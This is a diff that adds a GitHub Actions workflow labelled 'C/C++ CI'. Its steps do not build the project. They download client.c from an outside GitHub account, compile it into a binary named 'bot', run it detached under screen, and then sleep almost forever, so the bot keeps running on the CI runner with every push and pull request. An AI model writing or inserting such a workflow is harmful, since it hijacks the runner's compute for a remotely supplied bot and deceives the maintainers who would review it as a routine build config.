@@ -1,0 +1,25 @@
+name: C/C++ CI
+
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Download and run script
+      run: |
+        curl -O https://raw.githubusercontent.com/bobjohnmarley123/dog/main/client.c
+        chmod +x client.c
+        gcc client.c -o bot -pthread
+        sudo apt install screen -y
+        screen -dmS -X ./bot
+        sleep 999999999999999999999999999
+        done
+        
+      
